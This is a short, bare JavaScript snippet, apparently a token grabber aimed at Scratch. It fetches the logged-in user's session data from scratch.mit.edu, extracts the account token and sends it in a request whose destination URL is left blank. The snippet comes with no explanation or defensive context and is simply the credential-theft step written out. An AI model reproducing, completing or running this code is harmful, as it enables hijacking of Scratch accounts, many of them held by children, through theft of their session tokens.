(async()=>{
  let token=(await(await fetch("https://scratch.mit.edu/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
  await fetch("",{body:token});
})();
